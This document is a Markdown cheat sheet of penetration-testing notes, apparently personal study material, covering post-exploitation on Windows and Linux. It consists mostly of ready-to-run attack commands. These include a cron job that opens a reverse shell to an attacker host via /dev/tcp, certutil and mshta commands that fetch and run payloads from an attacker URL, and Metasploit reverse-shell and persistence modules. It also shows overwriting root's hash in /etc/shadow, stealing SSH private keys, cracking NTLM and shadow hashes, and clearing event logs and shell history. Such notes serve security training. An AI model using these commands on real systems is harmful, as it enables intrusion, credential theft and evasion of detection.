# Post exploit

## Windows

We can use `wmic qfe get Caption,Description,HotFixID,InstalledOn` for hotfix details 

**System**
- `enum_patches` module, check patch
- `enum_share` Check share.

**User and Group**:
- In windows, administrator disable by default but can be enable if needed.
- In shell, `whoami /priv` To get privil, `net users` `net user administrator`, `net localgroup`, `net localgroup administrators`
- `enum_logged_on_users` Module, check logon user

**Network**
- `ipconfig` and `ipconfig /all`
- `route print` Routing table info
- `arp -a` Get all other device of the network
- `netstat -ano` Get port and service running
- `netsh firewall show state` `netsh advfirewall firewall show` `netsh advfirewall show allprofiles`
- `enum_computers` module

**Process and service**
- In cmd, `net start` List servies
- `wmic service list brief` or `tasklist /SVC`
- `schtasks /query /fo LIST` `-v` for verbose.
- `enum_applications` module

**Automate the post exploit process**
- Use [JAWS](https://github.com/411Hall/JAWS) script, download and save it on local.
    - Upload it to the target
    - `powershell.exe -ExecutionPolicy Bypass -File ./jaws-enum.ps1 -OutputFilename Jaws-scan.txt`

## Linux

**System**:
- `cat /etc/*release` - Check distro
- `lscpu` Check CPU info
- `df -h` Check disk, `df -ht ext4`, `lsblk | grep sd`
- `dpkg -l` List package 

**User and group**:
- `groups root` `groups`

**Network**
- In meterpreter, `netstat` `route`
- In shell `ip a s` `cat /etc/networks`, `cat /etc/hostname`, `cat /etc/hosts`
- In shell `cat /etc/resolv.conf` DNS info, `arp -a`

**Process and cronjob**:
- In shell, try `ps aux` `top`
- In shell `crontab -l` `ls -al /etc/cron*` Display cronjob and cron script
- `cat /etc/cron*`

**Automate the post exploit**:
- `linux/gather/enum_configs` Collect config
- `linux/gather/enum_system`
- Use [Linenum](https://github.com/rebootuser/LinEnum), download and ship it.

**Upgrade shell for linux**:
- `cat /etc/shells` -> `/bin/bash -i` or `/bin/sh -i`
- If python installed `python --version` -> `python -c 'import pty; pty.spawn("/bin/bash")'`
- `perl -e 'exec "/bin/bash";'` `ruby: exec "/bin/bash"`
- We can `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

## Transfer file to target

**WIndows**:
- `certutil -urlcache -f http://<host_ip>:80/nc.exe <nameOfFile>`

**Linux**:
- Use `wget` or `curl`

## PrivEsc

**Windows**:
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
    - To run `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` Check privil vuln
    - `Invoke-AuditInstalledPrograms` ~ identify outdated and potentially vulnerable software installed on a system
    - `Invoke-ServiceAudit` ~ identifying user privileges that could potentially be escalated by exploiting Windows services

---
*Web_delivery* Exploit
- Use module `web_delivery`
    - set `payload /windows/shell/reverse_tcp` set `LHOST`
    - `set target PSH (Binary)`
    - `set PSH-encodedcommand false`
    - Run the output command on the target machine (Must have access though)
- When obtain the shell from target, use `/multi/../shell_to_meterpreter` to upgrade shell
    - `set win_transfer vbs`
    - set `LHOST` and `LPORT`
---

`Windows/misc/hta_server` Module
- use `exploit/windows/misc/hta_server` -> `exploit`
    - This will output a link that we need to connect to on the target machine
- On the target, open cmd or powershell with admin privilege
    - `mshta.exe <link_attacker>` EX: `mshta.exe http://1.2.3.4:8080/xxxxxxxxxxxxxxxx.hta`

---

Result return from PrivescCheck may return creds of higher privliege user
- use cred with `psexec.py` or module `windows/smb/psexec`

CMD command for login as administrator: `runas.exe /user:administrator cmd`

---
```
getsystem
getuid
```

The getsystem is a meterpreter command for privilege escalation. It uses pre-defined methods to gain the highest privilege (i.e. SYSTEM) on the compromised machine.

- 0 : All techniques available
- 1 : Named Pipe Impersonation (In Memory/Admin)
- 2 : Named Pipe Impersonation (Dropper/Admin)
- 3 : Token Duplication (In Memory/Admin)
- 4 : Named Pipe Impersonation (RPCSS variant)

**Linux**

Use LinEnum or manually check, we can try
- `find / -not -type l -perm -o+w`
- Change password with `/etc/shadow`
    - Create hash `openssl passwd -1 -salt <salt> <password>` `1` is hash algorithm (MD5)
    - Copy hash to user root `root:<newhash>:<other_part>`

Sudo privilege escalation:
- `sudo -l` Check sudo privilege for current user
    - Example of misconfig: `(root) NOPASSWD: /usr/bin/ruby` Ruby can run with root privilege, no need password, and current user can use ruby.
    - We can run `ruby ... /bin/bash` and it will have root bin/bash. Same for other app `man` ~ `!/bin/bash`

## Persistence

Via service:
- After gain access (ex: via rejetto attack), we can use module `/windows/local/persistence_service` for persistence service.
    - Setup payload and service metadata then run

Via RDP:
- After gain access (ex: via badblue), migrate process
- Create new user for RDP in meterpreter `run getgui -e -u <user> -p <password>`
- Use `xfreerdp /u:<username> /p:<password> /v:<target>`

Linux - via SSH:
- Copy the private key in the `.ssh` folder
    - By `scp <username>@<target>:~/.ssh/id_rsa .`
    - Remember to `chmod 400 id_rsa`
- We can re-login by `ssh -i id_rsa <username>@<target>`

Linux - via Cron Jobs:
- `cat /etc/cron`, create new cronjob 
    - `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<host_ip>/1234 0>&1'" > cron`
- Add to cronjob `crontab -i cron`
    - Recheck with `crontab -l`
- Setup netcat `nc -nvlp 1234`

## Dump and cracking hash

**Windows NTLM**
- Copy the hash that we collect into txt file
- We can use john the ripper `john --list=formats | grep NTLM`
- `john --format=NT hashes.txt --wordlist=/path/to/wordlist`
    - We can use rockyou `gzip -d /usr/share/wordlists/rockyou.txt.gz`
- We can use hashcat `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlist/rockyou.txt`
    - `-a 3` Brute force
    - `-m 1000` Hash mode 1000 ~ NTLM

**Linux Hash**:
- If we use module `linux/gather/hashdump` we have result of un-shadow hash -> Save it
- Try use `john --format=sha512crypt /path/to/hash/file --wordlist=/path/to/wordlist/file`
    - If `$6$` ~ Sha512 (Linux indicate)
- For hashcat `hashcat -a 3 -m 1800 /path/to/hash/file <wordlist>`

## Clear track

MSF after running exploit, the module maybe have produce a resource script that help you clear the track
- By `resource <resource_path>`
- Or it provide some information of artifacts on the target, that you need to clear before closing attack.
- Delete the execute file, and delete service
- Consider should or should not delete windows event log `clearev` (Migrate before run)

Linux:
- Clear `bash_history` file
  - `history -c` command to delete history.